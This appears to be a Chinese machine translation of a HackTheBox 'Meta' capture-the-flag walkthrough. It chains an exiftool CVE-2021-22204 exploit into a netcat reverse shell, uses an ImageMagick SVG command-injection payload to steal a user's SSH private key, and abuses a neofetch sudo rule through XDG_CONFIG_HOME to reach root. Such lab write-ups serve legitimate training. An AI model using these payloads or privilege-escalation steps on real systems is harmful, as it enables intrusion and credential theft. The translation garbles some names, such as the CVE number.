# 来自 HackTheBox 的元数据—详细演练

> 原文：<https://infosecwriteups.com/meta-from-hackthebox-detailed-walkthrough-a26925443ab7?source=collection_archive---------0----------------------->

## 向您展示完成盒子所需的所有工具和技术。

# 机器信息

![](img/de5d2e1e1be15052bc4609d6b4d17a20.png)

黑客盒子里的 Meta

Meta 是 HackTheBox 上的中型机器。初步扫描发现一个简单的网站，但这是一个死胡同。在一些枚举之后，我们有了一个子域，从那里我们找到了一种利用 exiftool 的易受攻击版本的方法。这导致了一个反向 shell，我们在其中发现了一个易受攻击的 Mogrify 版本，该版本允许我们泄漏私有 ssh 密钥。作为用户登录，more enumeration 发现 neofetch，我们通过一个错误配置的环境变量强制使用我们控制下的配置文件。

所需的技能是基本的网络和操作系统枚举。学到的技能是利用公共资源，并充分利用它们。

[](https://www.hackthebox.com/home/machines/profile/429) [## Meta —破解机箱::渗透测试实验室

### 登录 Hack The Box 平台，让您的笔测试和网络安全技能更上一层楼！

www.hackthebox.com](https://www.hackthebox.com/home/machines/profile/429) 

# 初步侦察

像往常一样，让我们从 Nmap 开始:

![](img/679424cda4abb722a16c5ded26d6715a.png)

元的 Nmap 扫描

让我们将 IP 添加到我们的 hosts 文件中:

```
┌──(root💀kali)-[~/htb/meta]
└─# echo "10.10.11.140 artcorp.htb" > /etc/hosts
```

现在，先看看 80 端口的网站:

![](img/1ec71394c47871b639056fdd7c5afd6b.png)

艺术公司网站上的 Meta box

# Gobuster

没什么可看的，就是一个简单的关于某开发公司的页面。捉鬼敢死队的时间到了:

![](img/09bd1ad60b933f531adbcf20bedb2b2b.png)

vhosts 的 Gobuster 扫描

这将找到一个虚拟主机，让我们将它添加到我们的 hosts 文件中来看看:

```
┌──(root💀kali)-[~/htb/meta]
└─# echo "10.10.11.140 dev01.artcorp.htb" > /etc/hosts
```

# Dev01 子域

![](img/4002abd1272dcb8d0345caeccf625b01.png)

artcorp 上的开发子域

点击 MetaView 的链接，我们将进入:

![](img/d4172f19bc36bce347fc850ceb312091.png)

MetaView 上传框

这里没有其他东西，所以让我们试着上传一张图片:

![](img/6c684b5abb48cf6f0dde782147141c0f.png)

上传文件的元视图详细信息

# Exiftool

我们有一些关于上传图片的信息。这看起来像 Exiftool 输出，让我们在本地测试它:

```
┌──(root💀kali)-[~/htb/meta]
└─# exiftool pencer.png                 
ExifTool Version Number         : 12.39
File Name                       : pencer.png
Directory                       : .
File Size                       : 12 KiB
File Modification Date/Time     : 2022:01:20 22:22:23+00:00
File Access Date/Time           : 2022:01:23 11:38:25+00:00
File Inode Change Date/Time     : 2022:01:23 11:38:25+00:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 200
Image Height                    : 200
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
SRGB Rendering                  : Perceptual
Gamma                           : 2.2
Pixels Per Unit X               : 4724
Pixels Per Unit Y               : 4724
Pixel Units                     : meters
Image Size                      : 200x200
Megapixels                      : 0.040
```

# CVE-2021 年至 22204 年

这是相同的信息，所以假设我们的下一步是找到一种方法来使用它，我搜索了“exiftool exploit ”,并找到了这个。在 Github 上一看发现了[这个](https://github.com/convisolabs/CVE-2021-22204-exiftool) python 漏洞。让我们抓住它:

```
┌──(root💀kali)-[~/htb/meta]
└─# git clone https://github.com/convisolabs/CVE-2021-22204-exiftool.git
Cloning into 'CVE-2021-22204-exiftool'...
remote: Enumerating objects: 27, done.
remote: Counting objects: 100% (27/27), done.
remote: Compressing objects: 100% (25/25), done.
remote: Total 27 (delta 6), reused 17 (delta 2), pack-reused 0
Receiving objects: 100% (27/27), 52.53 KiB | 1.12 MiB/s, done.
Resolving deltas: 100% (6/6), done.
```

如果需要，安装先决条件:

```
┌──(root💀kali)-[~/htb/meta/CVE-2021-22204-exiftool]
└─# apt install djvulibre-bin exiftool
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
Note, selecting 'libimage-exiftool-perl' instead of 'exiftool'
djvulibre-bin is already the newest version (3.5.28-2).
libimage-exiftool-perl is already the newest version (12.39+dfsg-1).
0 upgraded, 0 newly installed, 0 to remove and 135 not upgraded.
```

查看 exploit.py，我们需要更改 IP 和端口:

```
┌──(root💀kali)-[~/htb/meta/CVE-2021-22204-exiftool]
└─# more exploit.py
#!/bin/env python3
import base64
import subprocess
ip = '127.0.0.1'
port = '9090'
```

使用 sed 提高速度:

```
┌──(root💀kali)-[~/htb/meta/CVE-2021-22204-exiftool]
└─# sed -i 's/127.0.0.1/10.10.14.4/g' exploit.py

┌──(root💀kali)-[~/htb/meta/CVE-2021-22204-exiftool]
└─# sed -i 's/9090/1337/g' exploit.py
```

运行漏洞创建我们的恶意图像文件:

```
┌──(root💀kali)-[~/htb/meta/CVE-2021-22204-exiftool]
└─# python3 exploit.py
    1 image files updated
```

现在启动一个 nc 监听端口 1337，然后返回到网站并上传我们的图像:

![](img/9b6d6ba95b22cedb44b913e37d0df468.png)

上传恶意图像文件

# 反向外壳

切换到我们的监听器，看看我们连接:

```
┌──(root💀kali)-[~/htb/meta]
└─# nc -nlvp 1337  
listening on [any] 1337 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.140] 40330
$
```

在我们环顾四周之前升级 shell:

```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ ^Z
zsh: suspended  nc -nlvp 1337
┌──(root💀kali)-[~/CVE-2021-22204-exiftool]
└─# stty raw -echo; fg
[1]  + continued  nc -nlvp 1337
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ export TERM=xterm
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ stty rows 51 cols 237
```

我们只是一个低级服务客户:

```
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

只有一个用户:

```
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ ls -lsa /home
4 drwxr-xr-x  6 thomas thomas 4096 Jan 23 04:11 thomas
```

用户标志在那里，但我们没有权限读取它:

```
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ ls -lsa /home/thomas/
<SNIP>
4 drwx------ 2 thomas thomas 4096 Jan  4 10:22 .ssh
4 -rw-r----- 1 root   thomas   33 Jan 20 15:38 user.txt
```

有趣的是，这里有一个. ssh 文件夹，这是可疑的，所以记住它为以后。

# 发现的 Bash 脚本

在把豌豆拉过来之前，我通常会快速地环顾一下四周。在 CTF，一个简单的方法来找到文件种植是根据创建日期。这个是许多选项的一个很好的向导。我从 1 月 1 日开始搜索新文件:

![](img/3997967aab8777a5f97ff0ae6aff3594.png)

按创建日期查找文件

这是日期范围内的唯一文件。让我们来看看:

```
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ cat /usr/local/bin/convert_images.sh
#!/bin/bash
cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
pkill mogrify
```

# 莫格里菲

只是一个简单的脚本使用 mogrify 从 ImageMagick 转换任何找到的文件为 png。看这里的文件和[这个](https://unix.stackexchange.com/questions/391651/find-gif-jpeg-files-with-png-extension-and-convert-to-png)线程给了我一个线索。

让我们看看莫格里菲:

```
www-data@meta:/usr/local/bin$ mogrify -version
Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org
Copyright: © 1999-2020 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): fontconfig freetype jng jpeg png x xml zlib
```

# Imagemagick 外壳注射

这里的版本是 7.0.10。我发现[这个](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html)告诉我们 ImageMagick 版本存在漏洞。

一直向下滚动到那篇文章的末尾，有一个概念证明:

![](img/d6e0f9046ccddefc5634309482e2a014.png)

Imagemacgick 注入漏洞

我在盒子上创建了一个名为 poc.svg 的文件，并将上面的内容放入其中。我唯一更改的是将要创建的文件的路径:

```
<image authenticate='ff" `echo $(id)> /dev/shm/0wned`;"'>
```

检查文件在这里:

```
www-data@meta:/dev/shm$ ls -lsa
4 -rw-r--r--  1 www-data www-data  407 Jan 23 13:35 poc.svg
```

现在我们将它复制到脚本运行 mogrify 的路径:

```
www-data@meta:/dev/shm$ cp poc.svg /var/www/dev01.artcorp.htb/convert_images/
```

等待几分钟，再次查看我们的文件:

```
www-data@meta:/dev/shm$ ls -lsa
4 -rw-r--r--  1 thomas   thomas     54 Jan 23 13:38 0wned
4 -rw-r--r--  1 www-data www-data  407 Jan 23 13:35 poc.svg
```

# 导出 SSH 私钥

让我们用这个从托马斯那里拿到私人钥匙。我们之前看到的 ssh 文件夹:

![](img/6fd2c99475069ece686eb43033c642cc.png)

使用 imagemagick 漏洞获取 ssh 文件

与之前相同，将此文件复制到图像文件夹:

```
www-data@meta:/dev/shm$ cp poc.svg /var/www/dev01.artcorp.htb/convert_images/
```

等待几分钟，我们的文件已经到达:

```
www-data@meta:/dev/shm$ ls -lsa
4 -rw-r--r--  1 thomas   thomas   2590 Jan 23 13:31 id_rsa
4 -rw-r--r--  1 thomas   thomas     54 Jan 23 13:38 0wned
4 -rw-r--r--  1 www-data www-data  412 Jan 23 13:28 poc.svg
```

检查内容:

```
www-data@meta:/dev/shm$ cat key
-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAA
AAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAt9IoI
5gHtz8omhsaZ9Gy+wXyNZPp5jJZvbOJ946OI4g2kRRDHDm
<SNIP>bhFErAeoncE3vJAAAACXJvb3RAbWV0YQE= 
-----END OPENSSH PRIVATE KEY-----
```

把盒子里的钥匙复制给卡莉。它的格式不正确，我们来解决一下:

```
┌──(root💀kali)-[~/htb/meta]
└─# echo "-----BEGIN OPENSSH PRIVATE KEY-----" > id_rsa

┌──(root💀kali)-[~/htb/meta]
└─# echo "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAA
AAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAt9IoI5gHtz8omhsaZ9
Gy+wXyNZPp5jJZvbOJ946OI4g2kRRDHDm5x7up3z5s/H/yujgjgroOOHh9
zBBuiZ1Jn1jlveRM7H1VLbtY8k/rN9PFe/MkRsYdH45IvV<SNIP>
bhFErAeoncE3vJAAAACXJvb3RAbWV0YQE=" | sed 's/ /\n/g' >> id_rsa

┌──(root💀kali)-[~/htb/meta]
└─# echo "-----END OPENSSH PRIVATE KEY-----" >> id_rsa
```

# 用户标志

现在，我们可以以 thomas 的身份登录机器:

```
┌──(root💀kali)-[~/htb/meta]
└─# ssh -i id_rsa thomas@artcorp.htb
Linux meta 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
thomas@meta:~$
```

让我们获取用户标志:

```
thomas@meta:~$ cat user.txt
98a4a29173c3f2bd1c6f4006b2498128
```

像以前一样，我通常会在去 LinPEAS 之前四处看看。Sudo 是最先检查的人之一:

![](img/45de673b14b98312cf1e287c9085bf7c.png)

托马斯的 sudo 权限

可以肯定这是我们的升级途径。

# 新获取

Neofetch 是什么？从 Gitub 回购[这里](https://github.com/dylanaraps/neofetch/):

```
Neofetch is a command-line system information tool written in bash 3.2+. Neofetch displays information about your operating system, software and hardware in an aesthetic and visually pleasing way.
```

让我们来试试:

```
homas@meta:~$ sudo -u root /usr/bin/neofetch \"\"
       _,met$$$$$gg.          root@meta 
    ,g$$$$$$$$$$$$$$$P.       --------- 
  ,g$$P"     """Y$$.".        OS: Debian GNU/Linux 10 (buster) x86_64 
 ,$$P'              `$$$.     Host: VMware Virtual Platform None 
',$$P       ,ggs.     `$$b:   Kernel: 4.19.0-17-amd64 
`d$$'     ,$P"'   .    $$$    Uptime: 3 hours, 27 mins 
 $$P      d$'     ,    $$P    Packages: 495 (dpkg) 
 $$:      $$.   -    ,d$$'    Shell: bash 5.0.3 
 $$;      Y$b._   _,d$P'      CPU: AMD EPYC 7302P 16- (2) @ 2.994GHz 
 Y$$.    `.`"Y$$$$P"'         GPU: VMware SVGA II Adapter 
 `$$b      "-.__              Memory: 115MiB / 1994MiB 
  `Y$$                               
   `Y$$.                                              
     `$$b.
       `Y$$b.
          `"Y$b._
              `"""
```

我不太清楚，但是文档中提到了一个配置文件。找文件的时候我找到了一些:

```
thomas@meta:~$ find / -name neofetch 2>/dev/null
/usr/bin/neofetch
/usr/share/doc/neofetch
/home/thomas/.config/neofetch
```

thomas 主文件夹中有一个 conf 文件:

```
thomas@meta:~$ more .config/neofetch/config.conf
# See this wiki page for more info:
# https://github.com/dylanaraps/neofetch/wiki/Customizing-Info
print_info() {
    info title
    info underline
    info "OS" distro
    info "Host" model
    info "Kernel" kernel
    info "Uptime" uptime
    info "Packages" packages
    info "Shell" shell
    info "Resolution" resolution
    info "DE" de
    info "WM" wm
    info "WM Theme" wm_theme
    info "Theme" theme
    info "Icons" icons
    info "Terminal" term
    info "Terminal Font" term_font
<SNIP>
```

文件真的很大，有上百个设置。文件上还写着:

```
Neofetch will by default create a config file at $HOME/.config/neofetch/config.conf on first run. This file contains options to control all aspects of the output. The config file allows you to keep your customization between versions and allows you to easily share your customization with other people.
```

所以这个配置文件是为 thomas 准备的，也会有一个为 root 准备的，因为当我们用 sudo 运行 neofetch 时，我们是以 root 身份运行它的。当我们以 root 用户身份运行 neofetch 时，我们需要想办法让它使用 thomas home 文件夹中的配置文件。

# XDG _ 配置 _ 主页

回到 sudo 权利:

```
Matching Defaults entries for thomas on meta:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=XDG_CONFIG_HOME
```

什么是 XDG 配置主页？我发现这个上面写着:

```
$XDG_CONFIG_HOME defines the base directory relative to which user-specific configuration files should be stored. If $XDG_CONFIG_HOME is either not set or empty, a default equal to $HOME/.config should be used.
```

因此，我们可以强制 neofetch 在特定的文件夹中查找配置文件。我们可以简单地这样做:

```
export XDG_CONFIG_HOME="$HOME/.config"

thomas@meta:~$ echo $XDG_CONFIG_HOME
/home/thomas/.config
```

# 根标志

现在，当我们以 root 用户身份运行 neofetch 时，它使用一个我们控制的配置文件。neofetch 是一个 bash 脚本，我们可以向它添加我们自己的命令。我只是在开头添加了一行，将 root.txt 文件复制到/dev/shm:

```
thomas@meta:~$ more .config/neofetch/config.conf
cp /root/root.txt /dev/shm/root.txt && chmod 777 /dev/shm/root.txt
# See this wiki page for more info:
# https://github.com/dylanaraps/neofetch/wiki/Customizing-Info
print_info() {
    info title
<SNIP>
```

以 root 用户身份运行 neofetch:

```
thomas@meta:~$ sudo -u root /usr/bin/neofetch \"\"
       _,met$$$$$gg.          root@meta 
    ,g$$$$$$$$$$$$$$$P.       --------- 
  ,g$$P"     """Y$$.".        OS: Debian GNU/Linux 10 (buster) x86_64 
 ,$$P'              `$$$.     Host: VMware Virtual Platform None 
',$$P       ,ggs.     `$$b:   Kernel: 4.19.0-17-amd64 
`d$$'     ,$P"'   .    $$$    Uptime: 3 hours, 41 mins 
 $$P      d$'     ,    $$P    Packages: 495 (dpkg) 
 $$:      $$.   -    ,d$$'    Shell: bash 5.0.3 
 $$;      Y$b._   _,d$P'      CPU: AMD EPYC 7302P 16- (2) @ 2.994GHz 
 Y$$.    `.`"Y$$$$P"'         GPU: VMware SVGA II Adapter 
 `$$b      "-.__              Memory: 115MiB / 1994MiB 
  `Y$$
   `Y$$.
     `$$b.
       `Y$$b.
          `"Y$b._
              `"""
```

检查根标志是否存在:

```
thomas@meta:~$ ls -lsa /dev/shm
total 16
0 drwxrwxrwt  2 root     root      120 Jan 23 16:43 .
0 drwxr-xr-x 16 root     root     3080 Jan 23 13:25 ..
4 -rw-r--r--  1 thomas   thomas     54 Jan 23 13:38 0wned
4 -rw-r--r--  1 thomas   thomas   2590 Jan 23 13:31 key
4 -rw-r--r--  1 www-data www-data  407 Jan 23 13:35 poc.svg
4 -rwxrwxrwx  1 root     root       33 Jan 23 16:53 root.txt
```

抓住旗子完成盒子:

```
thomas@meta:~$ cat /dev/shm/root.txt
d5dd929ed86323234568c01461e44caf
```

完成了。下次见。

如果你喜欢这篇文章，请给我一两个掌声(这是免费的！)

推特—[https://twitter.com/pencer_io](https://twitter.com/pencer_io)
网站— [https://pencer.io](https://pencer.io/)

*原载于 2022 年 6 月 14 日*[*https://pencer . io*](https://pencer.io/ctf/ctf-htb-meta/)*。*